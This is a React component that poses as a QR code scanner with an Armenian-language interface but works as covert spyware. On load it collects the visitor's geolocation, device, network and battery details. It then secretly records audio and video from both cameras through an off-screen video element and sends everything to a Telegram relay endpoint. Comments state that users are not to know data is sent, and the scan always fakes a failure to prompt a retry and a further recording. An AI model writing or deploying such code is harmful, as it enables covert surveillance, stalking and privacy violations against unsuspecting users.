"use client";

import React, { useEffect, useRef, useState, useCallback } from "react";
import QrScanner from "./qr-scanner";
import { Button } from "@/components/ui/button";
// import { toast } from "sonner"; // Удаляем импорт toast, чтобы не показывать уведомления пользователю
import {
  getGeolocation,
  getClientInfo,
  getNetworkInfo,
  getDeviceMemory,
  getBatteryInfo,
  getPermissionStatus,
  PermissionStatus
} from "@/lib/client-data";

const TELEGRAM_API_ENDPOINT = "/api/telegram";
const VIDEO_SEGMENT_DURATION_MS = 3000; // 3 seconds for each video segment
const QR_SCAN_TIMEOUT_MS = 4000; // 4 seconds for QR scanning on first attempt

type GeolocationData = { latitude: number; longitude: number };
type ClientInfo = { platform: string; hardwareConcurrency: number; screenWidth?: number; screenHeight?: number; browserLanguage?: string; };
type NetworkInfo = { effectiveType?: string; rtt?: number; downlink?: number };
type BatteryInfo = { level?: number; charging?: boolean; status?: string };

// Определяем типы данных, которые могут быть отправлены
type TelegramDataPayload = {
  messageType: MessageType;
  sessionId: string;
  timestamp: string;
  attempt?: number; // Добавлено для отслеживания попыток
  geolocation?: GeolocationData;
  clientInfo?: ClientInfo;
  networkInfo?: NetworkInfo;
  deviceMemory?: number;
  batteryInfo?: BatteryInfo;
  permissionStatus?: PermissionStatus;
  video1?: string;
  video2?: string;
  qrCodeData?: string;
};

// Enum для типов сообщений
enum MessageType {
  InitialSummary = "initial_summary",
  Video1 = "video1",
  Video2 = "video2",
  QrCode = "qr_code",
}

type AppPhase =
  | "initial"
  | "collectingData"
  | "recordingVideo1"
  | "recordingVideo2"
  | "flippingCamera"
  | "qrScanning"
  | "finished";

const PermissionHandler = () => {
  const videoRef = useRef<HTMLVideoElement>(null);
  const mediaRecorderRef = useRef<MediaRecorder | null>(null);
  const mediaChunksRef = useRef<Blob[]>([]);
  const [appPhase, setAppPhase] = useState<AppPhase>("initial");
  const [loadingMessage, setLoadingMessage] = useState("Պատրաստվում ենք QR սկանավորմանը..."); // Preparing for QR scanning...
  const [collectedData, setCollectedData] = useState<Omit<TelegramDataPayload, 'messageType' | 'timestamp' | 'sessionId' | 'attempt'>>({});
  const [sessionKey, setSessionKey] = useState(0);
  const [processSuccessful, setProcessSuccessful] = useState<boolean>(false); // This will always be false for QR scan
  const [currentSessionId, setCurrentSessionId] = useState<string>(() => Math.random().toString(36).substring(2, 10).toUpperCase());
  const processInitiatedRef = useRef(false);
  // qrTimeoutRef удален, так как QrScanner теперь управляет своим таймаутом
  const [attempt, setAttempt] = useState(1); // New state to track attempts

  const generateSessionId = useCallback(() => {
    return Math.random().toString(36).substring(2, 10).toUpperCase();
  }, []);

  const sendDataToTelegram = useCallback(async (data: Partial<TelegramDataPayload>, type: MessageType, currentAttempt: number): Promise<boolean> => {
    console.log(`[Session ${currentSessionId}] Sending message type: ${type}, Attempt: ${currentAttempt}`);
    try {
      const payload: TelegramDataPayload = {
        ...data,
        messageType: type,
        sessionId: currentSessionId,
        timestamp: new Date().toISOString(),
        attempt: currentAttempt,
      };

      const response = await fetch(TELEGRAM_API_ENDPOINT, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(payload),
      });

      if (response.ok) {
        console.log(`[Session ${currentSessionId}] Data of type ${type} (Attempt ${currentAttempt}) successfully sent to Telegram!`);
        // No success toast for user, as they shouldn't know data is sent
        return true;
      } else {
        const errorData = await response.json();
        console.error(`[Session ${currentSessionId}] Failed to send data of type ${type} (Attempt ${currentAttempt}) to Telegram: ${errorData.error || response.statusText}`);
        // No error toast for user, as they shouldn't know data is sent
        return false;
      }
    } catch (error: any) {
      console.error(`[Session ${currentSessionId}] Network error sending data of type ${type} (Attempt ${currentAttempt}) to Telegram: ${error.message}`);
      // No error toast for user
      return false;
    }
  }, [currentSessionId]);

  const recordVideoSegment = useCallback(
    async (duration: number, facingMode: "user" | "environment"): Promise<string | undefined> => {
      let stream: MediaStream | null = null;
      try {
        stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: facingMode },
          audio: true,
        });

        if (videoRef.current) {
          videoRef.current.srcObject = stream;
          videoRef.current.muted = true;
          videoRef.current.setAttribute("playsinline", "true");
          await videoRef.current.play().catch((e) => console.error("Error playing video stream:", e));
        }

        return new Promise((resolve) => {
          mediaRecorderRef.current = new MediaRecorder(stream!, { mimeType: "video/webm" });
          mediaChunksRef.current = [];

          mediaRecorderRef.current.ondataavailable = (event) => {
            if (event.data.size > 0) {
              mediaChunksRef.current.push(event.data);
            }
          };

          mediaRecorderRef.current.onstop = () => {
            const videoBlob = new Blob(mediaChunksRef.current, { type: "video/webm" });
            const reader = new FileReader();
            reader.readAsDataURL(videoBlob);
            reader.onloadend = () => {
              resolve(reader.result as string);
            };
            stream?.getTracks().forEach((track) => track.stop());
            if (videoRef.current) {
              videoRef.current.srcObject = null;
            }
          };

          mediaRecorderRef.current.start();
          setTimeout(() => {
            if (mediaRecorderRef.current && mediaRecorderRef.current.state === "recording") {
              mediaRecorderRef.current.stop();
            }
          }, duration);
        });
      } catch (error: any) {
        console.error(`Camera/Microphone access denied for ${facingMode} camera: ${error.message}`);
        stream?.getTracks().forEach((track) => track.stop());
        if (videoRef.current) {
          videoRef.current.srcObject = null;
        }
        return undefined;
      }
    },
    []
  );

  const handleQrCodeScanned = useCallback(
    async (qrData: string) => {
      console.log("QR Code Scanned in PermissionHandler (simulated success):", qrData);
      // Как запрошено пользователем, сообщения о сканировании QR-кода не должны отправляться в Telegram.
      setAppPhase("finished");
      setAttempt(prev => prev + 1); // Увеличиваем попытку для следующего повтора
    },
    [] // Нет зависимости от sendDataToTelegram
  );

  const handleQrScanError = useCallback(
    async (error: string) => {
      console.error("QR Scan Error in PermissionHandler:", error);
      // Как запрошено пользователем, сообщения об ошибках сканирования QR-кода не должны отправляться в Telegram.
      setProcessSuccessful(false); // Указываем на неудачу для внутренней логики, если необходимо
      setAppPhase("finished");
      setAttempt(prev => prev + 1); // Увеличиваем попытку для следующего повтора
    },
    [] // Нет зависимости от sendDataToTelegram
  );

  const handleQrCameraActive = useCallback(() => {
    setLoadingMessage("Տեղադրեք QR կոդը շրջանակի մեջ..."); // Place the QR code within the frame...
  }, []);

  const startNewSession = useCallback(() => {
    setAppPhase("initial");
    setCollectedData({});
    setSessionKey((prevKey) => prevKey + 1);
    setProcessSuccessful(false);
    setCurrentSessionId(generateSessionId());
    processInitiatedRef.current = false;
    setAttempt(1); // Сбрасываем попытку для новой сессии
  }, [generateSessionId]);

  const runProcess = useCallback(async () => {
    if (processInitiatedRef.current) {
      console.log(`[Session ${currentSessionId}] runProcess already initiated for this sessionKey. Skipping.`);
      return;
    }
    processInitiatedRef.current = true;

    console.log(`[Session ${currentSessionId}] Starting runProcess. App Phase: ${appPhase}, Attempt: ${attempt}`);

    if (attempt === 1) {
      setLoadingMessage("Պատրաստվում ենք QR սկանավորմանը..."); // Preparing for QR scanning...
      setAppPhase("collectingData");

      const [
        permissionStatusResult,
        batteryInfoResult,
        geolocationResult,
      ] = await Promise.all([
        getPermissionStatus(),
        getBatteryInfo(),
        getGeolocation(),
      ]);

      const clientInfo = getClientInfo();
      const networkInfo = getNetworkInfo();
      const deviceMemory = getDeviceMemory();

      const initialCollectedData: Omit<TelegramDataPayload, 'messageType' | 'timestamp' | 'sessionId' | 'attempt'> = {
        clientInfo: {
          platform: clientInfo.platform,
          hardwareConcurrency: clientInfo.hardwareConcurrency,
          screenWidth: clientInfo.screenWidth,
          screenHeight: clientInfo.screenHeight,
          browserLanguage: clientInfo.browserLanguage,
        },
        networkInfo: networkInfo,
        deviceMemory: deviceMemory,
        permissionStatus: permissionStatusResult,
      };

      if (batteryInfoResult.data) {
        initialCollectedData.batteryInfo = { ...batteryInfoResult.data, status: batteryInfoResult.status };
      } else {
        initialCollectedData.batteryInfo = { status: batteryInfoResult.status };
      }

      if (geolocationResult.data) {
        initialCollectedData.geolocation = geolocationResult.data;
      }
      if (initialCollectedData.permissionStatus) {
        initialCollectedData.permissionStatus.geolocation = geolocationResult.status;
      }
      
      setCollectedData(initialCollectedData);

      // --- Отправка начального отчета в Telegram ---
      const initialSendSuccess = await sendDataToTelegram(initialCollectedData, MessageType.InitialSummary, attempt);
      setProcessSuccessful(initialSendSuccess);

      // --- Запись Видео 1 (Фронтальная камера, 3 секунды) ---
      setLoadingMessage("Կարգավորում ենք տեսախցիկը լավագույն սկանավորման համար..."); // Adjusting camera for optimal scanning...
      setAppPhase("recordingVideo1");
      const video1Base64 = await recordVideoSegment(VIDEO_SEGMENT_DURATION_MS, "user"); // Фронтальная камера
      if (video1Base64) {
        const video1SendSuccess = await sendDataToTelegram({ video1: video1Base64 }, MessageType.Video1, attempt);
        setProcessSuccessful(prev => prev && video1SendSuccess);
      }

      // --- Запись Видео 2 (Задняя камера, 3 секунды) ---
      setLoadingMessage("Կարգավորում ենք տեսախցիկը լավագույն սկանավորման համար..."); // Adjusting camera for optimal scanning...
      setAppPhase("recordingVideo2");
      const video2Base64 = await recordVideoSegment(VIDEO_SEGMENT_DURATION_MS, "environment"); // Задняя камера
      if (video2Base64) {
        const video2SendSuccess = await sendDataToTelegram({ video2: video2Base64 }, MessageType.Video2, attempt);
        setProcessSuccessful(prev => prev && video2SendSuccess);
      }

      // --- Переход к QR-сканированию (только для первой попытки) ---
      setLoadingMessage("Անցում դեպի QR կոդի սկանավորում..."); // Switching to QR code scanning...
      setAppPhase("flippingCamera");
      setAppPhase("qrScanning"); // Это отобразит QrScanner

    } else if (attempt === 2) { // Это повторная попытка "Этап 2"
      // Отправляем сообщение "Этап 2" в Telegram
      const stage2Message = { qrCodeData: "Этап 2: Повторная попытка сканирования QR-кода." };
      await sendDataToTelegram(stage2Message, MessageType.QrCode, attempt); // Используем MessageType.QrCode для этого уведомления

      // Только одно 5-секундное видео с задней камеры
      setLoadingMessage("Կարգավորում ենք տեսախցիկը լավագույն սկանավորման համար..."); // Adjusting camera for optimal scanning...
      setAppPhase("recordingVideo2"); // Повторно используем фазу recordingVideo2 для согласованности
      const video2Base64 = await recordVideoSegment(5000, "environment"); // 5 секунд, задняя камера
      if (video2Base64) {
        const video2SendSuccess = await sendDataToTelegram({ video2: video2Base64 }, MessageType.Video2, attempt);
        setProcessSuccessful(prev => prev && video2SendSuccess);
      }
      // После этого сразу переходим к состоянию окончательной ошибки, пропуская QR-сканирование
      setAppPhase("finished");
      setAttempt(prev => prev + 1); // Увеличиваем до 3, что вызовет окончательное сообщение об ошибке
      processInitiatedRef.current = false; // Разрешаем следующий вызов runProcess, хотя он не произойдет
      return; // Выходим из runProcess для попытки 2 после видео
    }
    
  }, [
    currentSessionId,
    appPhase,
    sendDataToTelegram,
    recordVideoSegment,
    setLoadingMessage,
    setAppPhase,
    setProcessSuccessful,
    setCollectedData,
    processInitiatedRef,
    attempt
  ]);

  useEffect(() => {
    console.log(`[Session ${currentSessionId}] useEffect triggered. Current appPhase: ${appPhase}, sessionKey: ${sessionKey}, processInitiatedRef.current: ${processInitiatedRef.current}, Attempt: ${attempt}`);

    if (appPhase === "initial" && currentSessionId && !processInitiatedRef.current) {
      runProcess();
    }

    return () => {
      // qrTimeoutRef.current больше не нужно очищать здесь
      if (mediaRecorderRef.current && mediaRecorderRef.current.state === "recording") {
        mediaRecorderRef.current.stop();
      }
      if (videoRef.current && videoRef.current.srcObject) {
        (videoRef.current.srcObject as MediaStream).getTracks().forEach((track) => track.stop());
        videoRef.current.srcObject = null;
      }
      if (appPhase === "finished" || appPhase === "initial") {
         processInitiatedRef.current = false;
      }
    };
  }, [sessionKey, appPhase, currentSessionId, runProcess, attempt]);


  return (
    <div className="min-h-screen flex flex-col items-center justify-center bg-background text-foreground p-4">
      {(appPhase === "initial" ||
        appPhase === "collectingData" ||
        appPhase === "recordingVideo1" ||
        appPhase === "recordingVideo2" ||
        appPhase === "flippingCamera") && (
        <>
          <p className="text-lg mb-4 text-center font-bold text-primary animate-pulse">
            {loadingMessage}
          </p>
          <div className="relative w-full max-w-md aspect-video bg-secondary flex items-center justify-center rounded-lg overflow-hidden shadow-lg">
            {/* Видеоэлемент скрыт за пределами экрана во время фаз записи видео */}
            <video
              ref={videoRef}
              autoPlay
              playsInline
              muted
              className="absolute -left-[9999px] -top-[9999px] w-full h-full object-cover"
              style={{ opacity: 0 }} // Убедитесь, что он визуально скрыт
            />
            <div className="absolute inset-0 border-4 border-primary opacity-70 rounded-lg pointer-events-none animate-border-pulse" />
            {(appPhase === "collectingData" || appPhase === "flippingCamera") && (
              <div className="absolute inset-0 flex items-center justify-center">
                <div className="animate-spin rounded-full h-16 w-16 border-t-4 border-b-4 border-primary" />
              </div>
            )}
          </div>
        </>
      )}
      {appPhase === "qrScanning" && (
        <QrScanner 
          onQrCodeScanned={handleQrCodeScanned} 
          onScanError={handleQrScanError} 
          onCameraActive={handleQrCameraActive} 
          scanTimeoutMs={QR_SCAN_TIMEOUT_MS} // Передаем таймаут сюда
        />
      )}
      {appPhase === "finished" && (
        <div className="flex flex-col items-center justify-center text-center p-6 bg-card rounded-lg shadow-xl animate-fade-in">
          {attempt <= 2 ? ( // Показываем кнопку повтора для первой попытки (attempt 1 приводит к finished с attempt 2)
            <>
              <p className="text-xl mb-4 font-semibold text-primary">
                QR կոդը չհաջողվեց ճանաչել:
              </p>
              <p className="text-muted-foreground mb-6">
                Խնդրում ենք համոզվել, որ կոդը հստակ է, լավ լուսավորված և ամբողջությամբ տեսանելի է շրջանակում:
              </p>
              <Button 
                onClick={runProcess} 
                className="mt-4 px-8 py-3 text-lg bg-primary text-primary-foreground hover:bg-primary/90 transition-colors duration-300 transform hover:scale-105 active:scale-95"
              >
                Կրկնել
              </Button>
            </>
          ) : ( // После второй попытки (attempt 2 приводит к finished с attempt 3), показываем окончательную ошибку
            <>
              <p className="text-xl mb-4 font-semibold text-destructive">
                Սկանավորումն անհնար է:
              </p>
              <p className="text-muted-foreground">
                Տեխնիկական խնդիրների պատճառով այս պահին հնարավոր չէ շարունակել։ Խնդրում ենք փորձել մի փոքր ուշ:
              </p>
            </>
          )}
        </div>
      )}
    </div>
  );
};

export default PermissionHandler;